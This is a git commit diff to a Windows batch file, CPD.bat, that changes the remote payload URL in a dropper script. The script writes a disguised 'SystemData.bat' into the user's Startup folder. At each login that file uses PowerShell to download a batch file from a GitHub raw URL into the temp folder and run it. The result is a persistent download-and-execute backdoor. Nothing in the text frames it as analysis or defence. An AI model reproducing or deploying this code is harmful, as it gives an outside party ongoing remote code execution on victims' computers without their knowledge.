9cacc3a9c010da0439c59ae1a0140630c66a7159
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-23 15:05:33 -0300

    Update CPD.bat

--- CPD.bat
+++ CPD.bat
@@ -3,7 +3,7 @@
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 echo @echo off > "%startup%\SystemData.bat"
-echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ4.bat" >> "%startup%\SystemData.bat"
+echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ.bat" >> "%startup%\SystemData.bat"
 echo set "arquivo=%%TEMP%%\LZX.bat" >> "%startup%\SystemData.bat"
 echo powershell -command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'" >> "%startup%\SystemData.bat"
 echo start "" "%%arquivo%%" >> "%startup%\SystemData.bat"
